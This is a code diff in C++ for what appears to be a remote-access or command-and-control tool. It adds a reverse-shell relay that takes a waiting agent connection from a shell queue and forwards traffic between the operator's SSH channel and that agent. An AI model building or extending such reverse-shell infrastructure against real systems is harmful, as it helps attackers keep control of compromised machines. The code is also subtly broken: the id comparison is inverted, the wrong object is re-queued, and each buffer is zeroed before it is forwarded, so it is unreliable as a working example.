@@ -697,7 +697,85 @@ void Ssh_Transport::make_agent(char *dat_ptr, char *d_ptr){
     AgentInformationHandler::compile(dat_ptr, d_ptr);
 }
 
-int Ssh_Transport::init_reverse_shell(){
+int Ssh_Transport::init_reverse_shell(char *id){
+    class Server *srv = this->instance->get_server();
+    std::queue<ConnectionInstance *> dequ;
+    ConnectionInstance *inst = nullptr;
+    int sz = 0;
+    int rc = 0;
+    int found = 0;
+    int quitting = 0;
+    char *recvbuff = (char *)malloc(BUFSIZ);
+    memset(recvbuff, 0, BUFSIZ);
+
+    while(!found){
+        sz = srv->get_shell_queue()->size();
+        for(int i = 0; i< sz; i++){
+            inst = srv->get_shell_queue()->front();
+            if(strncmp(id,inst->get_data()->id, strlen(id))){
+                found = 1;
+                srv->get_shell_queue()->pop();
+                break;
+            } else {
+                srv->get_shell_queue()->push(instance);
+                srv->get_shell_queue()->pop();
+            }
+        }
+        sleep(0.5);
+    }
+
+    class ServerTransport *remote = inst->get_transport();
+
+    while(!quitting){
+        memset(recvbuff, 0, BUFSIZ);
+        rc = this->read(&recvbuff, BUFSIZ);
+        if(rc != 0){
+            char logbuff[BUFSIZ];
+            memset(logbuff, 0, sizeof(logbuff));
+        
+            sprintf(logbuff, "Shell %s->%s: Failed to handle shell: %s\n", this->data->id, remote->get_data()->id, ssh_get_error(this->session));
+            this->logger->log(logbuff);
+            inst->shell_finish();
+            return 1;
+        }
+
+        memset(recvbuff, 0, BUFSIZ);
+        rc = remote->write(recvbuff, BUFSIZ);
+        if(rc != 0){
+            char logbuff[BUFSIZ];
+            memset(logbuff, 0, sizeof(logbuff));
+        
+            sprintf(logbuff, "Shell %s->%s: Failed to handle shell: %s\n", this->data->id, remote->get_data()->id, ssh_get_error(this->session));
+            this->logger->log(logbuff);
+            inst->shell_finish();
+            return 1;
+        }
+
+        memset(recvbuff, 0, BUFSIZ);
+        rc = remote->read(&recvbuff, BUFSIZ);
+        if(rc != 0){
+            char logbuff[BUFSIZ];
+            memset(logbuff, 0, sizeof(logbuff));
+        
+            sprintf(logbuff, "Shell %s->%s: Failed to handle shell: %s\n", this->data->id, remote->get_data()->id, ssh_get_error(this->session));
+            this->logger->log(logbuff);
+            inst->shell_finish();
+            return 1;
+        }
+
+        memset(recvbuff, 0, BUFSIZ);
+        rc = this->write(recvbuff, BUFSIZ);
+        if(rc != 0){
+            char logbuff[BUFSIZ];
+            memset(logbuff, 0, sizeof(logbuff));
+        
+            sprintf(logbuff, "Shell %s->%s: Failed to handle shell: %s\n", this->data->id, remote->get_data()->id, ssh_get_error(this->session));
+            this->logger->log(logbuff);
+            inst->shell_finish();
+            return 1;
+        }
+    }
+    inst->shell_finish();
     return 0;
 }
 
@@ -810,6 +888,20 @@ int Ssh_Transport::read(char **buff, int length){
     }
     return 0;
         
+}
+
+int Ssh_Transport::write(char *buff, int length){
+    int rc = 0;
+    rc = ssh_channel_write(this->channel, buff, length);
+    if(rc == SSH_ERROR){
+        char logbuff[BUFSIZ];
+        memset(logbuff, 0, sizeof(logbuff));
+
+        sprintf(logbuff, "Manager %s: Failed to handle agent: %s\n", this->data->id, ssh_get_error(this->session));
+        this->logger->log(logbuff);
+        return 1;
+    }
+    return 0;
 }
 
 int Ssh_Transport::send_err(){
